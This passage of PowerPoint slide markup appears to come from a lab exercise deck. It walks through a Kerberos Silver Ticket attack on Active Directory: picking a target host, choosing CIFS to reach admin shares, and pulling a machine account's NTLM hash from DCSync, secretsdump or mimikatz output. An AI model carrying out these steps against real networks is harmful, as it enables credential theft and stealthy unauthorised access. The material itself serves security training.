              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Silver Ticket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: Forge a TGS ticket for a specific service </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>(like CIFS or HTTP) to access a specific server without touching </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>the Domain Controller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700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>🧩 What a Silver Ticket actually is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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👉 A Silver Ticket is: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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>forged Kerberos service ticket (TGS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> for a specific service</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>🔥 Key difference from Golden Ticket</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700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9354075"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="100985" y="2607802"/>
          <a:ext cx="600710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2750">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1524269507"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1962150">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1185922918"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2362200">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="389534777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Feature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Golden Ticket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Silver Ticket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104294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Uses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KRBTGT hash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Service account hash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390128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Scope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Whole domain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One service/server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68978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Talks to DC?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Yes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❌ No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997869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Stealth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Medium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🔥 Very stealthy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06584077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BDA190E6-85F5-3DB7-1AEC-354B806BB99C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="100985" y="4644338"/>
            <a:ext cx="612058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800" dirty="0"/>
              <a:t>🎯 What your task is asking</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Forge a ticket that lets you access a specific service (like file share or web server)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Examples:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>CIFS → file shares (\\server\c$)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>HTTP → web apps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>MSSQL → database</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="264973725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11998712" cy="6858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700" dirty="0"/>
              <a:t> What you need BEFORE Silver Ticket</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>From earlier steps, you must have:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> Domain name (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> Domain SID → S-1-5-21-...</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> Service account hash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>🔑 What is “service account hash”?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 It’s the NTLM hash of the account running the service:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Examples:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700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700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>🔑 Important (MOST PEOPLE MISS THIS)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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👉 For Silver Ticket you do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>NOT use KRBTGT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👉 You use:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Arial Unicode MS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700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>Service account hash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1700" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/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4306841"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="92365" y="2905306"/>
          <a:ext cx="4857006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4357">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3638811346"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3502649">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="248938643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800" dirty="0"/>
                        <a:t>Service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Account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705545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/>
                        <a:t>CIFS (SMB)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Computer account (SERVER$)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224204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/>
                        <a:t>HTTP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Service account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947994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/>
                        <a:t>MSSQL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SQL service account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713581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2128282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44605"/>
            <a:ext cx="12192000" cy="68580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700" dirty="0"/>
              <a:t>Conceptual Flow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>STEP 1 — Identify target service</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Method 1 — Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> (BEST)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>📍 WHERE:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 Kali</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Steps:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Open </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Search for:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Computers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Click any machine (example: DC01 or FILESERVER)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>💥 You now have:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Target = DC01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434689"/>
            <a:ext cx="3038168" cy="17669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48318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12192000" cy="6646127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700" dirty="0"/>
              <a:t>Now decide service:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 For file access:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Service = CIFS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>✔ Done — Step 1 complete</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Method 2 — From Windows (VERY EASY)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>📍 WHERE:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 Windows victim shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Run:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>net view</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Output example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>\\DC01</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>\\WIN10</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>\\FILESERVER</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 Pick one:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Target = DC01</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Now choose service:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 Again:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Service = CIFS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="391223769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5722374" cy="6858000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2000" dirty="0"/>
              <a:t>✔ Done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000" dirty="0"/>
              <a:t> That’s literally it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000" dirty="0"/>
              <a:t>You now have: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000" dirty="0"/>
              <a:t>Target  = DC01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000" dirty="0"/>
              <a:t>Service = CIFS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000" dirty="0"/>
              <a:t>🔥 What this means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000" dirty="0"/>
              <a:t>👉 You are planning to access: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000" dirty="0"/>
              <a:t>\\DC01\c$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000" b="1" dirty="0"/>
              <a:t>STEP 2 — Get service account hash</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>📍 WHERE:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="20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2000" dirty="0"/>
              <a:t>👉 You need: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000" dirty="0"/>
              <a:t>NTLM hash of the TARGET machine account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2EAF5C7-8F07-685C-0462-E5BB83E06E65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5914103" y="0"/>
            <a:ext cx="6135328" cy="670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1800" dirty="0"/>
              <a:t>🔥 Example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800" dirty="0"/>
              <a:t>If your Step 1 was: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800" dirty="0"/>
              <a:t>Target = FILESERVER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800" dirty="0"/>
              <a:t>Service = CIFS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800" dirty="0"/>
              <a:t>👉 Then Step 2 becomes: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800" dirty="0"/>
              <a:t>FILESERVER$ → NTLM hash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800" dirty="0"/>
              <a:t> Why “FILESERVER$” ?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800" dirty="0"/>
              <a:t>👉 Every computer in AD is an account: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800" dirty="0"/>
              <a:t>FILESERVER  → FILESERVER$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800" dirty="0"/>
              <a:t>👉 And CIFS (file sharing) runs as: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800" dirty="0"/>
              <a:t>That computer account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800" dirty="0"/>
              <a:t> WHERE to get this hash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800" dirty="0"/>
              <a:t>👉 From your previous step (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>)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800" dirty="0"/>
              <a:t>Tools you used earlier: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800" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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800" dirty="0" err="1"/>
              <a:t>Impacket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11975746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12035883" cy="6690732"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Method 1 — If you used </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> already (MOST COMMON)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>👉 You already dumped domain hashes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>📍 WHERE:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>👉 Kali OR Windows (where you ran dump)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>💥 Look inside output:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You’ll see lines like:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Administrator:500:HASH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>krbtgt:502:HASH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>FILESERVER$:1001:HASH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>👉 THIS is what you want:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>FILESERVER$:NTLM_HASH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Method 2 — If you didn’t notice it earlier</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>👉 Re-check your dump file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>secretsdump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> output</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>or</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dcsync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> output</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>👉 Search for:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$   ← (dollar sign)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>💡 All computer accounts end with $</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> VERY IMPORTANT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>❌ WRONG:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Administrator hash ❌</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
